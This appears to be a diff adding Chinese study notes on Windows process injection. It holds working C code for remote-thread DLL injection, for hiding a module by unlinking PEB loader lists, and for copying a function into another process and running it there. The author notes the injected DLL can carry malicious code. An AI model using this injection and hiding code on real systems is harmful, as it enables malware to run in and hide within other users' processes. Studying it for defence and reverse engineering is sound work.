@@ -1386,3 +1386,548 @@ DWORD MappingFile(LPSTR lpcFile) {
 }
 ```
 
+
+
+### dll
+
+DLL文件的入口函数是**DllMain函数**
+
+
+
+```c
+BOOL WINAPI DllMain(
+  HINSTANCE hinstDLL,   // handle to the DLL module DLL模块的句柄，当前DLL被加载到什么位置
+  DWORD fdwReason,      // reason for calling function DLL被调用的原因，有4种情况：DLL_PROCESS_ATTACH（当某个进程第一次执行LoadLibrary）、DLL_PROCESS_DETACH（当某个进程释放了DLL）、DLL_THREAD_ATTACH（当某个进程的其他线程再次执行LoadLibrary）、DLL_THREAD_DETACH（当某个进程的其他线程释放了DLL）
+  LPVOID lpvReserved    // reserved
+);
+```
+
+
+
+## 远程线程
+
+**CreateThread**函数是在当前进程中创建线程，而**CreateRemoteThread**函数是允许在其他进程中创建线程，所以**远程线程就可以理解为是非本进程中的线程**。
+
+**CreateRemoteThread**
+
+```c
+HANDLE CreateRemoteThread(
+  HANDLE hProcess,                          // handle to process 输入类型，进程句柄
+  LPSECURITY_ATTRIBUTES lpThreadAttributes, // SD 输入类型，安全属性，包含安全描述符
+  SIZE_T dwStackSize,                       // initial stack size 输入类型，堆大小
+  LPTHREAD_START_ROUTINE lpStartAddress,    // thread function 输入类型，线程函数，线程函数地址应该是在别的进程中存在的
+  LPVOID lpParameter,                       // thread argument　输入类型，线程参数
+  DWORD dwCreationFlags,                    // creation option 输入类型，创建设置
+  LPDWORD lpThreadId                        // thread identifier 输出类型，线程id
+);
+```
+
+
+
+远程线程调用的是目标线程的代码
+
+
+
+首先创建A进程，代码如下：
+
+
+
+```c
+void Fun() {
+    for(int i = 0; i <= 5; i++) {
+        printf("Fun running... \n");
+        Sleep(1000);
+    }
+}
+ 
+DWORD WINAPI ThreadProc(LPVOID lpParameter) {
+    Fun();
+    return 0;
+}
+ 
+int main(int argc, char* argv[]) {
+    
+    HANDLE hThread = CreateThread(NULL, NULL, ThreadProc, NULL, 0, NULL);
+    
+    CloseHandle(hThread);
+ 
+    getchar();
+    return 0;
+}
+```
+
+
+
+进程B写了一个远程线程创建的代码：
+
+
+
+```c
+BOOL MyCreateRemoteThread(DWORD dwProcessId, DWORD dwProcessAddr) {
+    DWORD dwThreadId;
+    HANDLE hProcess;
+    HANDLE hThread;
+    // 1. 获取进程句柄
+    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
+    // 判断OpenProcess是否执行成功
+    if(hProcess == NULL) {
+        OutputDebugString("OpenProcess failed! \n");
+        return FALSE;
+    }
+    // 2. 创建远程线程
+    hThread = CreateRemoteThread(
+        hProcess,                          // handle to process
+        NULL, // SD
+        0,                       // initial stack size
+        (LPTHREAD_START_ROUTINE)dwProcessAddr,    // thread function
+        NULL,                       // thread argument
+        0,                    // creation option
+        &dwThreadId                        // thread identifier
+    );
+    // 判断CreateRemoteThread是否执行成功
+    if(hThread == NULL) {
+        OutputDebugString("CreateRemoteThread failed! \n");
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+ 
+    // 3. 关闭
+    CloseHandle(hThread);
+    CloseHandle(hProcess);
+ 
+    // 返回
+    return TRUE;
+}
+```
+
+
+
+## 远程线程注入
+
+在安全领域，“注入”是非常重要的一种技术手段，注入与反注入也一直处于不断变化的，而且也愈来愈激烈的对抗当中。
+
+**已知的注入方式：**
+
+远程线程注入、APC注入、消息钩子注入、注册表注入、导入表注入、输入法注入等等。
+
+
+
+远程线程注入的思路就是在进程A中创建线程，**将线程函数指向LoadLibrary函数**。
+
+
+
+**利用dll加载的时候，创建一个线程。dll劫持的味道。**
+
+
+
+DLL文件，在DLL文件入口函数判断并创建线程：
+
+```c
+#include "stdafx.h"
+ 
+DWORD WINAPI ThreadProc(LPVOID lpParaneter) {
+    for (;;) {
+        Sleep(1000);
+        printf("DLL RUNNING...");
+    }
+}
+ 
+BOOL APIENTRY DllMain( HANDLE hModule, 
+                       DWORD  ul_reason_for_call, 
+                       LPVOID lpReserved
+                     )
+{   // 当进程执行LoadLibrary时创建一个线程，执行ThreadProc线程
+    switch (ul_reason_for_call) {
+    case DLL_PROCESS_ATTACH:
+        CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL);
+        break;
+    }
+    return TRUE;
+}
+```
+
+
+
+演示
+
+
+
+````c
+#include "StdAfx.h"
+ 
+// LoadDll需要两个参数一个参数是进程ID，一个是DLL文件的路径
+BOOL LoadDll(DWORD dwProcessID, char* szDllPathName) {
+    
+    BOOL bRet;
+    HANDLE hProcess;
+    HANDLE hThread;
+    DWORD dwLength;
+    DWORD dwLoadAddr;
+    LPVOID lpAllocAddr;
+    DWORD dwThreadID;
+    HMODULE hModule;
+    
+    bRet = 0;
+    dwLoadAddr = 0;
+    hProcess = 0;
+    
+    // 1. 获取进程句柄
+    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID);
+    if (hProcess == NULL) {
+        OutputDebugString("OpenProcess failed! \n");
+        return FALSE;
+    }
+    
+    // 2. 获取DLL文件路径的长度，并在最后+1，因为要加上0结尾的长度
+    dwLength = strlen(szDllPathName) + 1;
+    
+    // 3. 在目标进程分配内存
+    lpAllocAddr = VirtualAllocEx(hProcess, NULL, dwLength, MEM_COMMIT, PAGE_READWRITE);
+    if (lpAllocAddr == NULL) {
+        OutputDebugString("VirtualAllocEx failed! \n");
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+    
+    // 4. 拷贝DLL路径名字到目标进程的内存
+    bRet = WriteProcessMemory(hProcess, lpAllocAddr, szDllPathName, dwLength, NULL);
+    if (!bRet) {
+        OutputDebugString("WriteProcessMemory failed! \n");
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+    
+    // 5. 获取模块句柄
+    // LoadLibrary这个函数是在kernel32.dll这个模块中的，所以需要现货区kernel32.dll这个模块的句柄
+    hModule = GetModuleHandle("kernel32.dll");
+    if (!hModule) {
+        OutputDebugString("GetModuleHandle failed! \n");
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+    
+    // 6. 获取LoadLibraryA函数地址
+    dwLoadAddr = (DWORD)GetProcAddress(hModule, "LoadLibraryA");
+    if (!dwLoadAddr){
+        OutputDebugString("GetProcAddress failed! \n");
+        CloseHandle(hModule);
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+    
+    // 7. 创建远程线程，加载DLL
+    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)dwLoadAddr, lpAllocAddr, 0, &dwThreadID);
+    if (!hThread){
+        OutputDebugString("CreateRemoteThread failed! \n");
+        CloseHandle(hModule);
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+    
+    // 8. 关闭进程句柄
+    CloseHandle(hThread);
+    CloseHandle(hProcess);
+    
+    return TRUE;
+}
+ 
+int main(int argc, char* argv[]) {
+    
+    LoadDll(384, "C:\\Documents and Settings\\Administrator\\桌面\\test\\B.dll");
+    getchar();
+    return 0;
+}
+````
+
+
+
+结论：打开目标程序，拿到句柄。在目前程序申请内存空间，把dll路径写进去(LoadLibraryA的参数)。然后在目标程序里面创建远程，调用LoadLibraryA加载dll。然后dll里面又可以存放恶意代码。
+
+我们要灵活运行远程线程，配合上win32api进行各种骚操作。
+
+
+
+## 模块隐藏
+
+前面的注入程序很容易就可以通过API来获取当前加载的DLL模块，所以我们需要使用模块隐藏技术来隐藏自己需要注入的DLL模块。
+
+
+
+### 模块隐藏之断链
+
+API是通过什么将模块查询出来的？其实API都是从这几个结构体（**结构体属于3环应用层**）中查询出来的：
+
+1. TEB(Thread Environment Block，线程环境块)，它存放线程的相关信息，每一个线程都有自己的TEB信息，FS:[0]即是当前线程的TEB。
+2. PEB(Process Environment Block，进程环境块)，它存放进程的相关信息，每个进程都有自己的PEB信息，FS:[0x30]即当前进程的PEB。
+
+
+
+
+
+FS寄存器中存储的就是当前正在使用的线程的TEB结构体的地址。
+
+![image-20220108220340853](https://gitee.com/safe6/img/raw/master/image-20220108220340853.png)
+
+
+
+然后找到30偏移出，跟随。
+
+![image-20220108220843365](https://gitee.com/safe6/img/raw/master/image-20220108220843365.png)
+
+![image-20220108221102610](https://gitee.com/safe6/img/raw/master/image-20220108221102610.png)
+
+
+
+
+
+我们了解到了API函数遍历模块就是查看PEB那个链表，所以我们要想办法让它**在查询的时候断链**。
+
+
+
+代码实现
+
+```c
+void HideModule(char* szModuleName) {
+    // 获取模块的句柄
+    HMODULE hMod = GetModuleHandle(szModuleName);
+    PLIST_ENTRY Head, Cur;
+    PPEB_LDR_DATA ldr;
+    PLDR_MODULE ldmod;
+    
+    __asm {
+        mov eax, fs:[0x30] // 取PEB结构体，fs30偏移处
+            mov ecx, [eax + 0x0c] // 取PEB结构体的00c偏移的结构体，就是PEB_LDR_DATA
+            mov ldr, ecx // 将ecx给到ldr
+    }
+    // 获取正在加载的模块列表
+    Head = &(ldr->InLoadOrderModuleList);
+    // 
+    Cur = Head->Flink;
+    do {
+        // 宏CONTAINING_RECORD根据结构体中某成员的地址来推算出该结构体整体的地址
+        ldmod = CONTAINING_RECORD(Cur, LDR_MODULE, InLoadOrderModuleList);
+        // 循环遍历，如果地址一致则表示找到对应模块来，就进行断链
+        if(hMod == ldmod->BaseAddress) {
+            // 断链原理很简单就是将属性交错替换
+            ldmod->InLoadOrderModuleList.Blink->Flink = ldmod->InLoadOrderModuleList.Flink;
+            ldmod->InLoadOrderModuleList.Flink->Blink = ldmod->InLoadOrderModuleList.Blink;
+            
+            ldmod->InInitializationOrderModuleList.Blink->Flink = ldmod->InInitializationOrderModuleList.Flink;
+            ldmod->InInitializationOrderModuleList.Flink->Blink = ldmod->InInitializationOrderModuleList.Blink;
+            
+            ldmod->InMemoryOrderModuleList.Blink->Flink = ldmod->InMemoryOrderModuleList.Flink;
+            ldmod->InMemoryOrderModuleList.Flink->Blink = ldmod->InMemoryOrderModuleList.Blink;
+        }
+        Cur = Cur->Flink;
+    } while (Head != Cur);
+}
+
+int main(int argc, char* argv[]) {
+    getchar();
+    HideModule("kernel32.dll");
+    getchar();
+    return 0;
+}
+```
+
+### 模块隐藏之PE指纹
+
+
+
+![](https://gitee.com/safe6/img/raw/master/image-20220108222205721.png)
+
+
+
+### 模块隐藏之VAD树
+
+
+
+
+
+## 注入代码
+
+
+
+复制代码的编写原则
+
+1. 不能有全局变量
+2. 不能使用常量字符串
+3. 不能使用系统调用
+4. 不能嵌套调用其他函数
+
+
+
+```c
+#include <tlhelp32.h>
+#include <stdio.h>
+#include <windows.h>
+ 
+typedef struct {
+    DWORD dwCreateAPIAddr;                // Createfile函数的地址
+    LPCTSTR lpFileName;                    // 下面都是CreateFile所需要用到的参数
+    DWORD dwDesiredAccess;
+    DWORD dwShareMode;
+    LPSECURITY_ATTRIBUTES lpSecurityAttributes;
+    DWORD dwCreationDisposition;
+    DWORD dwFlagsAndAttributes;
+    HANDLE hTemplateFile;
+} CREATEFILE_PARAM;
+ 
+// 定义一个函数指针
+typedef HANDLE(WINAPI* PFN_CreateFile) (
+    LPCTSTR lpFileName,
+    DWORD dwDesiredAccess,
+    DWORD dwShareMode,
+    LPSECURITY_ATTRIBUTES lpSecurityAttributes,
+    DWORD dwCreationDisposition,
+    DWORD dwFlagsAndAttributes,
+    HANDLE hTemplateFile
+);
+ 
+// 编写要复制到目标进程的函数
+DWORD _stdcall CreateFileThreadProc(LPVOID lparam)
+{
+    CREATEFILE_PARAM* Gcreate = (CREATEFILE_PARAM*)lparam;
+    PFN_CreateFile pfnCreateFile;
+    pfnCreateFile = (PFN_CreateFile)Gcreate->dwCreateAPIAddr;
+ 
+    // creatFile结构体全部参数
+    pfnCreateFile(
+        Gcreate->lpFileName,
+        Gcreate->dwDesiredAccess,
+        Gcreate->dwShareMode,
+        Gcreate->lpSecurityAttributes,
+        Gcreate->dwCreationDisposition,
+        Gcreate->dwFlagsAndAttributes,
+        Gcreate->hTemplateFile
+    );
+    
+    return 0;
+}
+ 
+// 远程创建文件
+BOOL RemotCreateFile(DWORD dwProcessID, char* szFilePathName)
+{
+    BOOL bRet;
+    DWORD dwThread;
+    HANDLE hProcess;
+    HANDLE hThread;
+    DWORD dwThreadFunSize;
+    CREATEFILE_PARAM GCreateFile;
+    LPVOID lpFilePathName;
+    LPVOID lpRemotThreadAddr;
+    LPVOID lpFileParamAddr;
+    DWORD dwFunAddr;
+    HMODULE hModule;
+    
+ 
+    bRet = 0;
+    hProcess = 0;
+    dwThreadFunSize = 0x400;
+    // 1. 获取进程的句柄
+    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID);
+    if (hProcess == NULL)
+    {
+        OutputDebugString("OpenProcessError! \n");
+        return FALSE;
+    }
+    // 2. 分配3段内存：存储参数，线程函数，文件名
+ 
+    // 2.1 用来存储文件名 +1是要计算到结尾处
+    lpFilePathName = VirtualAllocEx(hProcess, NULL, strlen(szFilePathName)+1, MEM_COMMIT, PAGE_READWRITE); // 在指定的进程中分配内存
+    
+    // 2.2 用来存储线程函数
+    lpRemotThreadAddr = VirtualAllocEx(hProcess, NULL, dwThreadFunSize, MEM_COMMIT, PAGE_READWRITE); // 在指定的进程中分配内存
+ 
+    // 2.3 用来存储文件参数
+    lpFileParamAddr = VirtualAllocEx(hProcess, NULL, sizeof(CREATEFILE_PARAM), MEM_COMMIT, PAGE_READWRITE); // 在指定的进程中分配内存
+ 
+ 
+    // 3. 初始化CreateFile参数
+    GCreateFile.dwDesiredAccess = GENERIC_READ | GENERIC_WRITE;
+    GCreateFile.dwShareMode = 0;
+    GCreateFile.lpSecurityAttributes = NULL;
+    GCreateFile.dwCreationDisposition = OPEN_ALWAYS;
+    GCreateFile.dwFlagsAndAttributes = FILE_ATTRIBUTE_NORMAL;
+    GCreateFile.hTemplateFile = NULL;
+    
+    // 4. 获取CreateFile的地址
+    // 因为每个进程中的LoadLibrary函数都在Kernel32.dll中，而且此dll的物理页是共享的，所以我们进程中获得的LoadLibrary地址和别的进程都是一样的
+    hModule = GetModuleHandle("kernel32.dll");
+    GCreateFile.dwCreateAPIAddr = (DWORD)GetProcAddress(hModule, "CreateFileA");
+    FreeLibrary(hModule);
+ 
+    // 5. 初始化CreatFile文件名
+    GCreateFile.lpFileName = (LPCTSTR)lpFilePathName;
+ 
+    // 6. 修改线程函数起始地址
+    dwFunAddr = (DWORD)CreateFileThreadProc;
+    // 间接跳
+    if (*((BYTE*)dwFunAddr) == 0xE9)
+    {
+        dwFunAddr = dwFunAddr + 5 + *(DWORD*)(dwFunAddr + 1);
+    }
+ 
+    // 7. 开始复制
+    // 7.1 拷贝文件名
+    WriteProcessMemory(hProcess, lpFilePathName, szFilePathName, strlen(szFilePathName) + 1, 0);
+ 
+    // 7.2 拷贝线程函数
+    WriteProcessMemory(hProcess, lpRemotThreadAddr, (LPVOID)dwFunAddr, dwThreadFunSize, 0);
+ 
+    // 7.3 拷贝参数
+    WriteProcessMemory(hProcess, lpFileParamAddr, &GCreateFile, sizeof(CREATEFILE_PARAM), 0);
+ 
+    // 8. 创建远程线程
+    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpRemotThreadAddr, lpFileParamAddr, 0, &dwThread);// lpAllocAddr传给线程函数的参数.因为dll名字分配在内存中
+    if (hThread == NULL)
+    {
+        OutputDebugString("CreateRemoteThread Error! \n");
+        CloseHandle(hProcess);
+        CloseHandle(hModule);
+        return FALSE;
+    }
+ 
+    // 9. 关闭资源
+    CloseHandle(hProcess);
+    CloseHandle(hThread);
+    CloseHandle(hModule);
+    return TRUE;
+ 
+}
+ 
+// 根据进程名称获取进程ID
+DWORD GetPID(char *szName)
+{
+    HANDLE hProcessSnapShot = NULL;
+    PROCESSENTRY32 pe32 = {0};
+    
+    hProcessSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hProcessSnapShot == (HANDLE)-1)
+    {
+        return 0;
+    }
+    
+    pe32.dwSize = sizeof(PROCESSENTRY32);
+    if (Process32First(hProcessSnapShot, &pe32))
+    {
+        do {
+            if (!strcmp(szName, pe32.szExeFile)) {
+                return (int)pe32.th32ProcessID;
+            }
+        } while (Process32Next(hProcessSnapShot, &pe32));
+    }
+    else
+    {
+        CloseHandle(hProcessSnapShot);
+    }
+    return 0;
+}
+ 
+int main()
+{
+    RemotCreateFile(GetPID("进程名"), "文件名");
+    return 0;
+}
+```
+
